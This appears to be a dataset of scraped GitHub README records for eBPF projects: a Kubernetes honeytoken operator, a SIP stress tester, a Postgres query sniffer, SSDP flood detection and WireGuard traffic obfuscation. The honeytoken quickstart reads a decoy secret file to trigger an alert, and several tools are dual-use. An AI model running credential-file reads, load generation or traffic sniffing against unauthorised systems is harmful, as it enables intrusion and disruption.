[![GitHub Latest Release](https://img.shields.io/github/v/release/dynatrace-oss/koney?style=flat-square)](https://github.com/dynatrace-oss/koney/releases/latest)
[![GitHub License](https://img.shields.io/github/license/dynatrace-oss/koney?style=flat-square)](LICENSE.txt)

**Koney is a Kubernetes operator that enables you to define so-called deception policies for your cluster.**
Koney automates the setup, rotation, and teardown of honeytokens and fake API endpoints, and uses eBPF to detect, log, and forward alerts when your traps have been accessed.

Currently, Koney supports the deployment of [honeytokens](https://en.wikipedia.org/wiki/Honeytoken), i.e., files that appear sensitive and are placed in strategic locations to detect unauthorized access to sensitive data. Soon, we also support other cyber deception techniques, such as deceptive HTTP endpoints and payloads. Contributions are welcome!

- ðŸª¤ Deter Attackers.
- ðŸ”Ž Build Threat Intelligence.
- ðŸš¢ Designed for Kubernetes.

## ðŸš€ Quickstart

Install the operator in your cluster and wait for it to be ready:

```sh
kubectl apply -f https://raw.githubusercontent.com/dynatrace-oss/koney/refs/tags/v0.1.0/dist/install.yaml
kubectl wait --for=condition=ready pod -n koney-system -l control-plane=controller-manager
```

Deploy a sample deception policy:

```sh
kubectl apply -f https://raw.githubusercontent.com/dynatrace-oss/koney/main/config/samples/deceptionpolicy-servicetoken.yaml
```

This policy will add a honeytoken at `/run/secrets/koney/service_token` in all pods that have the label `demo.koney/honeytoken=true` set.
Place that label on a pod or deployment to see the honeytoken in action:

```sh
kubectl label pod <pod-name> demo.koney/honeytoken=true
```

Try accessing the honeytoken:

```sh
kubectl exec -it <pod-name> -- cat /run/secrets/koney/service_token
```

â„¹ï¸ **Note:** To monitor traps and receive alerts, [Tetragon](https://tetragon.io/docs/installation/kubernetes/) must also be installed with the `dnsPolicy=ClusterFirstWithHostNet` configuration. See [Captor Deployment](#captor-deployment) for more information.

Wait a few seconds, and observe the alert that is generated when the honeytoken is accessed:

```sh
kubectl logs -n koney-system -l control-plane=controller-manager -c alerts -f --since 1h
```

## ðŸ“ƒ Usage

|                               ðŸš¨ **Important: Koney is an early-stage research project!** ðŸš¨                                |
| :-------------------------------------------------------------------------------------------------------------------------: |
| We recommend using Koney in a test environment. The API and behavior may change without prior notice. Use at your own risk. |

To deploy traps in our cluster, we need to create `DeceptionPolicy` custom resources.

### Deception Policy

A deception policy is a custom resource definition (CRD) that defines the traps that we want to deploy and in which pods we want to deploy them. A deception policy has kind `DeceptionPolicy` and includes a collection of `traps`. Each trap has the following fields:

- Its type (e.g., `filesystemHoneytoken` for honeytokens) and some trap-specific fields.
- A `match` entry that selects to what resources the trap shall be applied.
- A `decoyDeployment` entry that defines how the trap itself shall be deployed.
- A `captorDeployment` entry that defines how monitoring of the trap shall be deployed.

Moreover, the following fields apply to the whole policy and all traps:

- `strictValidation`: a boolean that indicates whether the policy should be strictly validated. The default value is `true`, which means that the traps in the policy are deployed only if all the traps are valid. If `strictValidation` is set to `false`, the policy is still applied, but only the valid traps are deployed. A trap is considered valid if all the required fields are present and their values are valid.
- `mutateExisting`: a boolean that indicates whether the traps should be deployed in objects that already existed before the policy was created. The default value is `true`, which means that the traps are also added to existing objects. Typically, that means that existing resource definitions will be updated to include the traps. Depending on the decoy and captor deployment strategies of each individual trap, this may require restarting the pods. If you want to avoid that existing workloads are restarted, set `mutateExisting` to `false`.

To apply a deception policy, use the following command:

```sh
kubectl apply -f <deceptionpolicy-file>.yaml
```

To delete a deception policy, use the following command:

```sh
kubectl delete -f <deceptionpolicy-file>.yaml
```

â„¹ï¸ **Note:** Deception policies are cluster-wide objects, so no namespace is specified.

#### `filesystemHoneytoken` Trap

The `filesystemHoneytoken` trap deploys a honeytoken in the filesystem of a pod. It has the following fields:

- `filePath`: the path where the honeytoken is deployed. It must be an absolute path and must point to a file. Note that if the `filePath` is a symbolic link, captors deployed with Tetragon will not be able to capture the access to the file (as explained [here](https://isovalent.com/blog/post/file-monitoring-with-ebpf-and-tetragon-part-1/#whats-in-a-pathname)).
- `fileContent`: the content of the honeytoken file. By default, it is an empty string.
- `readOnly`: a boolean that indicates whether the honeytoken file is read-only. The default value is `true`.

ðŸ§ª For example, the following `filesystemHoneytoken` trap deploys a read-only honeytoken in the `/run/secrets/koney/service_token` file with the content `someverysecrettoken`:

```yaml
traps:
  - filesystemHoneytoken:
      filePath: /run/secrets/koney/service_token
      fileContent: ""someverysecrettoken""
      readOnly: true
```

#### Match

The `match` field is used to select the Kubernetes resources (i.e., pods or deployments, and containers) where we want to deploy the trap. It contains the `any` field, which includes resource filters that will be matched with a logical OR operation.

The `any` field is a list and holds one or more `resources` objects, which contain the following filters (both `namespaces` and `selector` are optional, but at least one of the two must be present):

- `namespaces`: a list of namespaces. It does NOT support wildcards. The trap is only deployed in pods that belong to any of the namespaces in the list.
- `selector`: a label selector. It does NOT support wildcards. The trap is only deployed in pods with labels that match the selector. If you specify multiple labels or expressions, all of them have to match for traps to be deployed. `selector` has two fields:

  - `matchLabels`: a map of key-value pairs.
  - `matchExpressions`: a list of label selector requirements evaluated as a logical AND operation. **(not implemented yet)**

- `containerSelector`: selects the container(s) in the matched pods or deployments where the trap is deployed. It supports the same pattern syntax as [`filepath.Match`](https://pkg.go.dev/path/filepath#Match) (e.g., `*` matches zero or more characters, `?` matches any single characte. The default value is `*`, which means that the trap is deployed in all containers in the matched pods.

ðŸ§ª For example, the following `match` field selects all pods in the `koney` namespace, and all pods with the label `demo.koney/honeytoken: ""true""`:

```yaml
match:
  any:
    - resources:
        namespaces:
          - koney
        selector:
          matchLabels:
            demo.koney/honeytoken: ""true""
        containerSelector: ""*""
```

â„¹ï¸ **Note**: Tetragon's tracing policies do not support wildcards in the `containerSelector` field. This is not a problem when the `containerSelector` field is set to a specific container name or set to `*`. However, when the `containerSelector` field is set to a pattern, the tracing policy is created with an empty `containerSelector` field, matching all containers in the pod. See [Captor Deployment](#captor-deployment) for more information about tracing policies. Moreover, tracing policies do not support the `namespaces` field. Therefore, tracing policies match pods in all namespaces.

#### Decoy Deployment

The `decoyDeployment` field defines how a trap is deployed. It has the following fields:

- `strategy`: the strategy used to deploy the trap. It can be `volumeMount`, `containerExec`, or `kyvernoPolicy`. The default value is `volumeMount`. Based on the strategy, Koney matches different types of resources. The strategies are:

  - `volumeMount`: the trap is deployed by mounting a volume in the matched pods. Koney matches deployments.
  - `containerExec`: the trap is deployed by executing a command in the container(s) of the matched pods. Koney matches pods.
  - `kyvernoPolicy`: the trap is deployed by creating a Kyverno policy that mutates manifests such that they also contain traps. Requires that [Kyverno](https://kyverno.io/) is installed in the cluster. **(not implemented yet)**

â„¹ï¸ **Note**: At the moment, Koney does not match ReplicaSet, DaemonSet, StatefulSet, and Jobs.

â„¹ï¸ **Note**: Some values are trap-specific. Refer to the trap-specific documentation above to learn more.

ðŸ§ª For example, the following `decoyDeployment` field deploys a honeytoken in all containers in the matched pods using the `containerExec` strategy:

```yaml
decoyDeployment:
  strategy: containerExec
```

#### Captor Deployment

The `captorDeployment` field defines how a captor is deployed. It has the following fields:

- `strategy`: the strategy used to deploy the captor. At the moment, it can only be `tetragon`. The default value is `tetragon`. The strategies are:

  - `tetragon`: the captor is deployed by creating and applying a Tetragon `TracingPolicy` CR in the cluster. Requires that [Tetragon](https://tetragon.io/) is installed in the cluster with the `dnsPolicy=ClusterFirstWithHostNet` configuration.

ðŸ§ª For example, the following `captorDeployment` field deploys a captor using the `tetragon` strategy:

```yaml
captorDeployment:
  strategy: tetragon
```

ðŸš¨ **Important**: Tetragon must be installed in the cluster for the `tetragon` strategy to work. Tetragon must be installed with the `dnsPolicy=ClusterFirstWithHostNet` configuration so that it can resolve the addresses to Koney's services. You can upgrade an existing Tetragon Helm installation with the following command:

```sh
helm upgrade tetragon cilium/tetragon -n kube-system --set dnsPolicy=ClusterFirstWithHostNet
```

### Status Conditions

The `DeceptionPolicy` resource has a `status` field that includes a list of conditions. Status conditions are used to provide information about the deployment status of the deception policy.

Each condition has a `type`, a `status`, a `reason` and a `message`. The `status` can be `True`, `False`, or `Unknown`. The `reason` and `message` fields provide more information about the condition. The `type` can be one of the following:

- `ResourceFound`: indicates whether the deception policy has been found by the operator and it is not marked for deletion.

- `PolicyValid`: indicates whether the traps in the deception policy are valid. The `reason` is `TrapsSpecValid` if all the traps are valid, `TrapsSpecInvalid` if at least one trap is invalid. The `message` provides information about how many traps are valid compared to the total number of traps (e.g., `1/2 traps are valid`).

- `DecoysDeployed`: indicates whether the decoys (i.e., the trap itself) in the deception policy have been deployed. The `reason` is `DecoyDeploymentSucceeded` if all the decoys have been deployed, `DecoyDeploymentSucceededPartially` if some, but not all decoys have been deployed, or `DecoyDeploymentError` if at least one decoy has not been deployed. The `message` provides information about how many decoys have been deployed compared to the total number of decoys (e.g., `1/2 decoys deployed`). If Koney matched no resources based on the `match` field, the `reason` is `NoObjectsMatched`.

- `CaptorsDeployed`: indicates whether the captors (i.e., monitoring of the trap) in the deception policy have been deployed. The `reason` is `CaptorDeploymentSucceeded` if all the captors have been deployed, `CaptorDeploymentSucceededPartially` if some, but not all captors have been deployed, or `DecoyDeploymentError` if at least one captor has not been deployed. The `message` provides information about how many captors have been deployed compared to the total number of captors (e.g., `1/2 captors deployed`). If Koney matched no resources based on the `match` field, the `reason` is `NoObjectsMatched`.

### Workload Annotations

Koney uses annotations to keep track of the traps that have been deployed to a pod, and to provide an easy way for cluster administrators to see which traps are deployed in a pod.

Koney uses a single JSON-structured annotation, `koney/changes`. This annotation contains a list of `DeceptionPolicy` names that have been deployed to the pod. Each deception policy in the annotation includes a list of traps that have been deployed to the pod. Each trap includes:

- The trap type with the trap-specific fields.
- The deployment strategy.
- The list of containers where the trap is deployed.
- Two timestamps: one for when the trap was first deployed, one for when it was last updated.

ðŸ§ª For example, the following `koney/changes` annotation indicates that a `filesystemHoneytoken` trap has been deployed in the `nginx` container of the pod using the `containerExec` strategy:

```json
[
  {
    ""deceptionPolicyName"": ""deceptionpolicy-sample"",
    ""traps"": [
      {
        ""deploymentStrategy"": ""containerExec"",
        ""containers"": [""nginx""],
        ""createdAt"": ""2024-09-09T13:09:14Z"",
        ""updatedAt"": ""2024-09-09T16:11:42Z"",
        ""filesystemHoneytoken"": {
          ""filePath"": ""/run/secrets/koney/service_token"",
          ""fileContentHash"": ""75170fc230cd88f32e475ff4087f81d9"",
          ""readOnly"": true
        }
      }
    ]
  }
]
```

To see the traps deployed in a pod, use the following command:

```sh
kubectl get pod <pod-name> -n <namespace> -o jsonpath='{.metadata.annotations.koney/changes}' | jq
```

â„¹ï¸ **Note**: The `jq` command is used to format the JSON output and can also be omitted.

### Cleanup

When a deception policy is deleted, Koney removes all the traps that have been deployed by that policy from the pods where they were deployed. This is done by using the `koney/changes` annotation, that is considered the source of truth for the deployed traps. If the annotation is manually modified, Koney will not be able to clean up the traps correctly.

## ðŸ§ª Sample Policies

### Deploy a Honeytoken

The following deception policy deploys a honeytoken in the `/run/secrets/koney/service_token` file with the content `som"
novartc/sipbench,5,0,5,0,Go,High-performance SIP stress testing tool based on eBPF/XDP,2025-08-05T09:45:06Z,2025-09-23T07:45:26Z,3,"# SIPBench

A high-performance SIP (Session Initiation Protocol) benchmarking tool that integrates eBPF/XDP to implement kernel-level packet processing for RTP media.

It provides User Agent Client (UAC), User Agent Server (UAS) and SIPREC Session Recording Server (SRS) functions. It can support **8k** concurrent sessions (including media) on a single machine.

## Installation

Binary can be downloaded from the [Releases](https://github.com/novartc/sipbench/releases) page.

## Usage

### UAC (Client)

```bash
./sipbench uac [options] <destination>
```

Example:
```bash
# Generate calls to SIP server at 10.0.0.2:8626
sudo ./sipbench uac --interface veth2 --address 10.0.0.3 --port 5060 \
  --rate 2 --max-calls 10 --total-calls 100 \
  --user 9196 10.0.0.2:8626
```

**Example Explanation:**
- `--interface veth2`: Uses the veth2 network interface
- `--address 10.0.0.3`: Binds the UAC to local IP address 10.0.0.3
- `--port 5060`: Uses port 5060 for SIP signaling
- `--rate 2`: Generates 2 new calls per second
- `--max-calls 10`: Maintains maximum of 10 concurrent active calls
- `--total-calls 100`: Stops after making 100 total calls
- `--user 9196`: Sets the SIP user identifier to 9196 for outgoing calls
- `10.0.0.2:8626`: Target SIP server address and port to send calls to

### UAS (Server)

```bash
./sipbench uas [options]
```

Example:
```bash
# Listen on veth2, port 5060
sudo ./sipbench uas --interface veth2 --address 10.0.0.3 --port 5060 \
  --ringing-timeout 5 --answer-timeout 20 --answer-chance 10 \
  --early-media 30 --answer-media 30
```

**Example Explanation:**
- `--interface veth2`: Uses the veth2 network interface
- `--address 10.0.0.3`: Listens on IP address 10.0.0.3
- `--port 5060`: Listens on port 5060 for SIP signaling
- `--ringing-timeout 5`: Rings for 5 seconds before proceeding to answer decision
- `--answer-timeout 20`: Waits up to 20 seconds before hang up the call
- `--answer-chance 10`: Only answers 10% of incoming calls
- `--early-media 30`: Plays 30 seconds of white noise as early media during ringing
- `--answer-media 30`: Plays 30 seconds of white noise as media after answering calls

### Configuration Options

#### UAC Options
- `--interface`: Network interface name for eBPF/XDP binding (default: ""eth0"")
- `--address`: Local bind address for SIP signaling
- `--port`: Local bind port for SIP signaling (default: 5060)
- `--rate`: Call rate in calls per second (default: 10)
- `--max-calls`: Maximum number of concurrent calls (default: 1)
- `--total-calls`: Total number of calls to make (default: 0, unlimited)
- `--user`: SIP remote user identifier
- `--min-rtp-port`: Minimum RTP port range (default: 20000)
- `--max-rtp-port`: Maximum RTP port range (default: 60000)
- `--ringing-timeout`: Ringing timeout in seconds (default: ""5"")
- `--answer-timeout`: Answer timeout in seconds (default: ""20"")
- `--early-media`: Early media content - white noise duration, pcap file, or pcm file (default: ""30"")
- `--answer-media`: Answer media content - white noise duration, pcap file, or pcm file (default: ""30"")
- `--xdp-size`: XDP ring buffer size, must be power of 2 (default: 4096)

#### UAS Options
- `--interface`: Network interface name for eBPF/XDP binding (default: ""eth0"")
- `--address`: Listen address for SIP signaling
- `--port`: Listen port for SIP signaling (default: 5060)
- `--public-addr`: NAT/public address for SIP Contact header (defaults to --address)
- `--answer-chance`: Probability of answering calls (0-100, default: 100)
- `--min-rtp-port`: Minimum RTP port range (default: 20000)
- `--max-rtp-port`: Maximum RTP port range (default: 60000)
- `--ringing-timeout`: Ringing timeout in seconds (default: ""5"")
- `--answer-timeout`: Answer timeout in seconds (default: ""20"")
- `--early-media`: Early media content - white noise duration, pcap file, or pcm file (default: ""30"")
- `--answer-media`: Answer media content - white noise duration, pcap file, or pcm file (default: ""30"")
- `--xdp-size`: XDP ring buffer size, must be power of 2 (default: 4096)

## Troubleshooting

### Common Issues

1. **eBPF Loading Failures**: Ensure kernel supports eBPF/XDP and you have root privileges
"
Aditya1404Sal/task,7,0,7,0,Rust,Rust-eBPF (AYA) based runtime process monitoring service.,2025-08-11T06:44:00Z,2025-09-13T01:12:11Z,8,"# Rust-eBPF (AYA) based runtime process monitoring service.

## Prerequisites

1. stable rust toolchains: `rustup toolchain install stable`
1. nightly rust toolchains: `rustup toolchain install nightly --component rust-src`
1. (if cross-compiling) rustup target: `rustup target add ${ARCH}-unknown-linux-musl`
1. (if cross-compiling) LLVM: (e.g.) `brew install llvm` (on macOS)
1. (if cross-compiling) C toolchain: (e.g.) [`brew install filosottile/musl-cross/musl-cross`](https://github.com/FiloSottile/homebrew-musl-cross) (on macOS)
1. bpf-linker: `cargo install bpf-linker` (`--no-default-features` on macOS)

## Build & Run

Use `cargo build`, `cargo check`, etc. as normal. Run your program with:

```shell
cargo run --release --config 'target.""cfg(all())"".runner=""sudo -E""'
```

Cargo build scripts are used to automatically build the eBPF correctly and include it in the
program.

## Dependencies

- rust version : 1.86.0 nightly (for local running you'll need to override your rustup to 1.86.0)

## Running this applicaation via docker-compose

- a simple `docker compose up --build` will work

## system binary filtering

- modify `/task/src/constant.rs` with the commands of your choice (I have pre-loaded a few based on my testing) [ **max entries are 10**, can be modified at `/task-ebpf/src/main.rs` and increasing the max entries of `EXCLUDED_CMDS`]

## tracing

### RUST_LOG=info -> logs all captured events on the usersapce side

control env trace via the `docker-compose.yml`
```yml
  environment:
      - RUST_LOG=info
```

## Endpoints

**Server runs on port 3000**

| Endpoint | Description | Example |
|----------|-------------|---------|
| `GET /executions` | Returns 500 most recent execve syscall events | `curl http://localhost:3000/executions` |
| `GET /executions/:pid` | Returns event info for a specific PID | `curl http://localhost:3000/executions/31145` |



## Unit tests : 

- check out `/task/src/store.rs` for the added unit tests

---

## Cross-compiling on macOS

Cross compilation should work on both Intel and Apple Silicon Macs.

```shell
CC=${ARCH}-linux-musl-gcc cargo build --package task --release \
  --target=${ARCH}-unknown-linux-musl \
  --config=target.${ARCH}-unknown-linux-musl.linker=\""${ARCH}-linux-musl-gcc\""
```
The cross-compiled program `target/${ARCH}-unknown-linux-musl/release/task` can be
copied to a Linux server or VM and run there.

## License

With the exception of eBPF code, task is distributed under the terms
of either the [MIT license] or the [Apache License] (version 2.0), at your
option.

Unless you explicitly state otherwise, any contribution intentionally submitted
for inclusion in this crate by you, as defined in the Apache-2.0 license, shall
be dual licensed as above, without any additional terms or conditions.

### eBPF

All eBPF code is distributed under either the terms of the
[GNU General Public License, Version 2] or the [MIT license], at your
option.

Unless you explicitly state otherwise, any contribution intentionally submitted
for inclusion in this project by you, as defined in the GPL-2 license, shall be
dual licensed as above, without any additional terms or conditions.

[Apache license]: LICENSE-APACHE
[MIT license]: LICENSE-MIT
[GNU General Public License, Version 2]: LICENSE-GPL2
"
zzzzz167/Larkspur,9,0,9,0,Rust,A real-time performance analyzer based on eBPF and Rust,2025-08-02T09:12:35Z,2025-08-29T10:22:00Z,5,"# larkspur

## Prerequisites

1. stable rust toolchains: `rustup toolchain install stable`
1. nightly rust toolchains: `rustup toolchain install nightly --component rust-src`
1. (if cross-compiling) rustup target: `rustup target add ${ARCH}-unknown-linux-musl`
1. (if cross-compiling) LLVM: (e.g.) `brew install llvm` (on macOS)
1. (if cross-compiling) C toolchain: (e.g.) [`brew install filosottile/musl-cross/musl-cross`](https://github.com/FiloSottile/homebrew-musl-cross) (on macOS)
1. bpf-linker: `cargo install bpf-linker` (`--no-default-features` on macOS)

## Build & Run

Use `cargo build`, `cargo check`, etc. as normal. Run your program with:

```shell
cargo run --release --config 'target.""cfg(all())"".runner=""sudo -E""'
```

Cargo build scripts are used to automatically build the eBPF correctly and include it in the
program.

## Cross-compiling on macOS

Cross compilation should work on both Intel and Apple Silicon Macs.

```shell
CC=${ARCH}-linux-musl-gcc cargo build --package larkspur --release \
  --target=${ARCH}-unknown-linux-musl \
  --config=target.${ARCH}-unknown-linux-musl.linker=\""${ARCH}-linux-musl-gcc\""
```
The cross-compiled program `target/${ARCH}-unknown-linux-musl/release/larkspur` can be
copied to a Linux server or VM and run there.

## License

With the exception of eBPF code, larkspur is distributed under the terms
of either the [MIT license] or the [Apache License] (version 2.0), at your
option.

Unless you explicitly state otherwise, any contribution intentionally submitted
for inclusion in this crate by you, as defined in the Apache-2.0 license, shall
be dual licensed as above, without any additional terms or conditions.

### eBPF

All eBPF code is distributed under either the terms of the
[GNU General Public License, Version 2] or the [MIT license], at your
option.

Unless you explicitly state otherwise, any contribution intentionally submitted
for inclusion in this project by you, as defined in the GPL-2 license, shall be
dual licensed as above, without any additional terms or conditions.

[Apache license]: LICENSE-APACHE
[MIT license]: LICENSE-MIT
[GNU General Public License, Version 2]: LICENSE-GPL2
"
Query-Doctor/stethoscope,17,1,17,1,C,Listen to database queries going through your system with eBPF,2025-08-03T17:11:31Z,2025-09-16T22:49:15Z,1,"# Stethoscope

Experimental eBPF-based, database-agnostic query collector. Automatically grabs queries made by your applications without making changes to them.

### Postgres Support
Only postgres is supported right now based on our specific needs.
- Query string
- Response timing
- Connection details (ip:port)
- Process name
- Whether the query is encrypted

Does _not_ currently support getting concrete parameter values for prepared statements. Though it's certainly doable.

```sh
# Listens for postgres queries
docker run privileged -v /sys/kernel/tracing:/sys/kernel/tracing -v /usr/lib:/usr/lib query-doctor/stethoscope
```

```json
{""db"":""postgres"",""ip"":""72.144.105.10"",""port"":5432,""pid"":3896124,""process_name"":""python3"",""query"":""SELECT 999 + 1;"",""delta"":6.289313,""encrypted"":true}
{""db"":""postgres"",""ip"":""72.144.105.10"",""port"":5432,""pid"":3896124,""process_name"":""python3"",""query"":""SELECT 999 + 1;"",""delta"":6.252741,""encrypted"":true}
{""db"":""postgres"",""ip"":""72.144.105.10"",""port"":5432,""pid"":3896124,""process_name"":""python3"",""query"":""SELECT 999 + 1;"",""delta"":6.238099,""encrypted"":true}
{""db"":""postgres"",""ip"":""127.0.0.1"",""port"":5432,""pid"":3896818,""process_name"":""psql"",""query"":""begin; PREPARE q(int) AS SELECT  + 1;"",""delta"":0.570156,""encrypted"":false}
{""db"":""postgres"",""ip"":""127.0.0.1"",""port"":5432,""pid"":3896818,""process_name"":""psql"",""query"":""EXECUTE q(42); commit;"",""delta"":0.418718,""encrypted"":false}
{""db"":""postgres"",""ip"":""127.0.0.1"",""port"":5432,""pid"":3897122,""process_name"":""psql"",""query"":""select 'hi mom'"",""delta"":0.288139,""encrypted"":false}
```

## Contributing

Generate the vmlinux.h file based on your kernel

`TODO: add required dependencies`

```
bpftool btf dump file /sys/kernel/btf/vmlinux format c > ebpf/vmlinux.h
```

```
go generate && go run .
```
"
Mys7erio/eBPF-Sentinel,15,1,15,0,Go,"High-throughput, in-kernel network packet classification using machine learning (Proof-of-Concept)",2025-08-03T16:23:18Z,2025-09-01T09:58:08Z,6,"# eBPF Sentinel: SSDP Flood Detection with eBPF and ML
[![DOI](https://zenodo.org/badge/1031386959.svg)](https://doi.org/10.5281/zenodo.16792155)

<div style=""text-align: justify;"">

**eBPF Sentinel** is a program that uses eBPF (extended Berkeley Packet Filter), a feature of the Linux kernel that allows it to run small, safe programs inside the kernel to monitor and extend the kernel's capabilities, without needing to modify the kernel itself. The eBPF program is connected using XDP (eXpress Data Path), a way to process network packets super early, (right when the packets arrive at the computer's NIC).

The tool focuses on detecting SSDP flood attacks, which are a type of denial-of-service (DoS) attack that overwhelms systems by sending too many messages using SSDP. It sends details about suspicious packets from the kernel to a Go program running in normal user space. There, a machine learning model checks if it's an attack. If it is, the malicious IP address is added to a blacklist in the kernel, ensuring subsequent packets from the same IP address are dropped. This follows a ""Pseudo zero-trust"" approach, where nothing is trusted until it's checked.

The project is built to run on devices like OpenWRT routers, and other resource constrained environements for protecting networks at the edge. It uses C for the kernel-space program (fast and low-level), Go for receiving the data packets and using the ML model to make a verdict. Python was used train and export the ML model.
</div>

## What it does

- **Fast Packet Checking in the Kernel**: Uses XDP to look at packets as soon as they arrive and check if they're from a known bad source using a quick lookup list (an eBPF map).
- **ML for Spotting Attacks**: Pulls out key info from packets (IP addresses, ports, and other attributes) and uses a decision tree model to decide if it's part of a flood attack.
- **Automatic Blocking**: If an attack is detected, it updates the kernel's list to block that source instantly, so the next packets are stopped without extra work.
- **Works on Different Systems**: Thanks to CO-RE (Compile Once - Run Everywhere), the kernel code can adjust to different Linux versions without recompiling.
- **Easy to Run on Routers**: You can build the Go app on your computer to match the router's hardware (like ARM processors) and copy it over.
- **Zero-Trust Security**: Treats every packet as potentially harmful and uses ML to verify it before letting it through.

## Demonstration
![eBPF Sentinel Screenshot](ebpf-sentinel-demo.png)


> [!NOTE]  
> This project is a very early stage PoC (Proof of Concept) and is not meant for production use by any means. It's meant for research purposes only, to demonstrate how eBPF can be used with machine learning to perform state-of-the-art detection of network attacks on resource constrained environments.

## Prerequisites

- **A \*Nix like Operating System**: Ubuntu / Debian is prefered (tested on Ubuntu 24.04).
- **Go**: Version 1.18 or newer.
- **Clang and LLVM Tools**: For compiling the C code into an eBPF object file.
- **Python 3.8 or Later**: With libraries like scikit-learn and nyoka for training and exporting the ML model.
- **An eBPF enabled (edge) device**: Version 5.10 or higher, with eBPF enabled is required to load and run the eBPF program.


> [!IMPORTANT]  
> Edit the main.go file and replace `eth0` with your network interface name (like `ens33` or `wlan0`) to match your system's configuration, before proceeding ahead with building the program.

## Installation

### Step 1: Get the Code

```bash
git clone https://github.com/yourusername/eBPF-sentinel.git
cd eBPF-sentinel
```

### Step 2: Install Go Dependencies

```bash
go mod tidy
```

### Step 3: Install Tools (on Ubuntu)

```bash
sudo apt update
sudo apt install -y clang llvm linux-headers-$(uname -r)
```

### Step 4: Build the eBPF Object file

```bash
# using makefile
make

# or manually using clang
clang -O2 -g -target bpf -I /usr/include/x86_64-linux-gnu -c eBPF-sentinel.c -o eBPF-sentinel.o
```

### Step 5: Build the go program

```bash
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o eBPF-sentinel.elf main.go

# Build for an x86_64 architectured OpenWRT router
make openwrt
```


## Usage

### Running on Your Computer

```bash
sudo go run main.go
```

- It connects the program to your network interface (like `ens33`).
- Test by sending fake SSDP packets with a tool like Scapy.
- Watch the logs to see if it detects the malicious packets.

### Putting It on an OpenWRT Router

1. **Build for the Router**:
   ```bash
   GOOS=linux GOARCH=arm64 go build -o eBPF-sentinel.elf main.go
   ```

2. **Copy to the Router**:
   - Transfer the `eBPF-sentinel.elf` file, the eBPF object file, and the ML model file.

3. **Start It**:
   ```bash
   chmod +x ./eBPF-sentinel.elf
   sudo ./eBPF-sentinel.elf
   ```

## How It Works

1. **Kernel Program (in C)**: This runs inside the Linux kernel. It receives incoming packets, checks if it's a UDP packet, and if it is, it sends packet details to the Go app using a special buffer.
2. **Go App**: Loads the kernel program, listens for those details, runs the ML model to check for attacks, and tells the kernel to block malicious IPs.
3. **ML Model**: A decision tree that looks at packet info and decides if it's an attack based on what it learned from training data.




"
stillya/wg-relay,25,0,25,0,Go,An eBPF-based traffic obfuscation system that try to disguises WireGuard protocol traffic to bypass DPI and government censorship,2025-08-13T21:40:47Z,2025-09-21T19:00:43Z,10,"# WGRelay

[![Build Status](https://github.com/stillya/wg-relay/actions/workflows/build.yml/badge.svg)](https://github.com/stillya/wg-relay/actions/workflows/build.yml)
[![Coverage](https://coveralls.io/repos/github/stillya/wg-relay/badge.svg?branch=master)](https://coveralls.io/github/stillya/wg-relay?branch=master)

An eBPF-based traffic obfuscation system that disguises WireGuard protocol traffic to bypass DPI and government
censorship

## Overview

The WireGuard eBPF Proxy intercepts WireGuard packets at the kernel level, applies lightweight obfuscation, and
transparently routes them through a proxy server before reaching the actual WireGuard endpoint. This helps circumvent
network restrictions while maintaining the security and performance benefits of WireGuard.

## Architecture

```
Client                 Obfuscator Proxy           WireGuard Server
  |                          |                          |
  | WG packets               |                          |
  |------------------------->|                          |
  |                          | Obfuscated packets       |
  |                          |------------------------->|
  |                          |                          | Real WG packets
  |                          |                          |----------> WG Server
  |                          |                          |
  |                          | WG Response              |
  |                          |<-------------------------|
  | Deobfuscated response    |                          |
  |<-------------------------|                          |
```

## Requirements

- Linux kernel 5.4+ with eBPF support
- Root privileges for eBPF operations
- Go 1.21+
- WireGuard tools

## Quick Start

### 1. Build

```bash
make build
```

### Testing

```bash
# Run all tests (requires root privileges)
make test

# Run only eBPF unit tests
make test-ebpf
```

### 2. Configuration

Create a `config.yaml` file:

```yaml
mode: ""forward""                  # ""forward"" or ""reverse""
enabled: true                    # Enable/disable obfuscation

daemon:
  listen: "":8080""                # Daemon bind address

proxy:
  method: ""xor""                           # Obfuscation method(Currently only ""xor"" is supported)
  key: ""my_secret_key_32_bytes_long_123""  # Obfuscation key
  driver_mode: ""driver""                    # use generic if you at containerized environment
  interfaces:
    - ""eth0""                # Main interface to intercept
  forward:
    target_server_ip: ""192.168.200.2"" # Target WireGuard server IP
```

### 3. Run

```bash
# Run daemon
sudo make run-daemon

# Or run in specific network namespace
sudo make run-forward-proxy    # ebpf-proxy namespace
sudo make run-reverse-proxy    # wg-server namespace
```

## Configuration

### Proxy Modes

- **Forward Mode**: Intercepts outbound WireGuard traffic, obfuscates it, and forwards to target server
- **Reverse Mode**: Handles bidirectional traffic processing for server-side deployment

### Obfuscation Methods

- **XOR**: Simple XOR-based obfuscation with configurable key
- **None**: Pass-through mode for testing

### XDP Driver Modes

- **Driver**: Native XDP mode (better performance, requires driver support)
- **Generic**: Generic XDP mode (broader compatibility, slightly lower performance)

## Monitoring & Statistics

### Console Statistics (vnstat-style)

The daemon provides real-time traffic statistics in a vnstat-style table format:

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚               wg-relay traffic statistics           â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                   rx      tx    total   avg. rate   â”‚
â”‚      from_wg   10.5 KB  8.2 KB  18.7 KB   1.2 KB/s  â”‚
â”‚        to_wg    8.2 KB 10.5 KB  18.7 KB   1.2 KB/s  â”‚
â”‚        total   18.7 KB 18.7 KB  37.4 KB   2.4 KB/s  â”‚
â”‚                                                     â”‚
â”‚   estimated    1.6 MB per day                       â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

Enable statistics monitoring in config:

```yaml
monitoring:
  statistics:
    enabled: true
    interval: 5s
```

### Prometheus Metrics

